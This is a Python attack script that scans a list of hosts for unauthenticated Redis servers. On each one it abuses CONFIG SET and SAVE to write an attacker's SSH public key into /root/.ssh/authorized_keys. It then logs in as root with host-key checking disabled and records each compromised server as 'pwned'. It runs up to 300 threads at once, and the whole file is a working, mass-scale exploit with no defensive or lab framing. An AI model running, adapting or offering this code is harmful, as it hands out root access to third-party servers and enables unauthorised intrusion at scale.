#!/usr/bin/env python3
"""Redis -> SSH key, SAVE-gated. Only SSH-test hosts where SAVE succeeded."""
import sys,os,socket,json,time,threading,subprocess,re
from concurrent.futures import ThreadPoolExecutor, as_completed
KEYFILE=os.environ.get("KOPS_KEY_FILE","~/.ssh/kops_vps")
KEYFILE=os.path.expanduser(KEYFILE)
PUB=open(KEYFILE+".pub").read().strip() if os.path.exists(KEYFILE+".pub") else subprocess.check_output(["ssh-keygen","-y","-f",KEYFILE]).decode().strip()
def resp(*a):
    o=b"*%d\r\n"%len(a)
    for x in a:
        if isinstance(x,str): x=x.encode()
        o+=b"$%d\r\n%s\r\n"%(len(x),x)
    return o
class R:
    def __init__(s,h,p,t=5):
        s.s=socket.create_connection((h,p),timeout=t); s.s.settimeout(t); s.b=b""
    def cmd(s,*a):
        s.s.sendall(resp(*a)); return s.rd()
    def rd(s):
        while b"\r\n" not in s.b:
            d=s.s.recv(65536)
            if not d: return None
            s.b+=d
        l,s.b=s.b.split(b"\r\n",1); t,r=l[:1],l[1:]
        if t==b"+": return r.decode(errors="replace")
        if t==b"-": return "ERR:"+r.decode(errors="replace")
        if t==b":": return int(r)
        if t==b"$":
            n=int(r)
            if n==-1: return None
            while len(s.b)<n+2:
                d=s.s.recv(65536)
                if not d: return None
                s.b+=d
            v,s.b=s.b[:n],s.b[n+2:]; return v.decode(errors="replace")
        if t==b"*":
            n=int(r); return [s.rd() for _ in range(n)] if n>0 else []
        return None
    def close(s):
        try:s.s.close()
        except:pass
def stage(host):
    ip,port=host.rsplit(":",1); port=int(port)
    try:
        r=R(ip,port)
        if r.cmd("PING")!="PONG": r.close(); return None
        d=r.cmd("CONFIG","SET","dir","/root/.ssh")
        if d!="OK": r.close(); return {"host":host,"ip":ip,"dir":d}
        r.cmd("CONFIG","SET","dbfilename","authorized_keys")
        r.cmd("SET","k","\n\n"+PUB+"\n\n")
        sv=r.cmd("SAVE")
        r.close()
        return {"host":host,"ip":ip,"save":sv,"good":(sv=="OK")}
    except Exception:
        return None
def ssh(ip,t=6):
    try:
        p=subprocess.run(["ssh","-i",KEYFILE,"-o","StrictHostKeyChecking=no","-o","UserKnownHostsFile=/dev/null",
                          "-o",f"ConnectTimeout={t}","-o","BatchMode=yes",f"root@{ip}","id -u; hostname"],
                         capture_output=True,text=True,timeout=t+5)
        o=(p.stdout or "")+(p.stderr or "")
        if re.search(r"^0\s*$",o,re.M): return True,o.strip().replace("\n"," ")[:100]
    except Exception: pass
    return False,""
def main():
    hosts=[l.strip() for l in open(sys.argv[1]) if l.strip()]
    print("targets",len(hosts),flush=True); t0=time.time()
    unauth=[];good=[]
    with ThreadPoolExecutor(max_workers=300) as ex:
        for i,f in enumerate(as_completed([ex.submit(stage,h) for h in hosts])):
            r=f.result()
            if r:
                unauth.append(r)
                if r.get("good"): good.append(r)
            if (i+1)%3000==0: print(f"  {i+1}/{len(hosts)} unauth={len(unauth)} saveOK={len(good)} {time.time()-t0:.0f}s",flush=True)
    print("STAGE unauth",len(unauth),"saveOK",len(good),flush=True)
    json.dump(unauth,open("/tmp/redis_unauth3.json","w"),indent=1)
    pwned=[]
    with ThreadPoolExecutor(max_workers=120) as ex:
        futs={ex.submit(ssh,g["ip"]):g for g in good}
        for f in as_completed(futs):
            g=futs[f]; ok,ev=f.result()
            if ok:
                g["PROVEN"]="SSH_KEY"; g["evidence"]=ev; pwned.append(g)
                json.dump(pwned,open("/tmp/redis_pwned3.json","w"),indent=1)
                print(f"🔥 {g['host']} {ev}",flush=True)
    json.dump({"scanned":len(hosts),"unauth":unauth,"pwned":pwned},open("/tmp/redis_result3.json","w"),indent=1)
    print("DONE PWNED",len(pwned),f"{time.time()-t0:.0f}s",flush=True)
main()
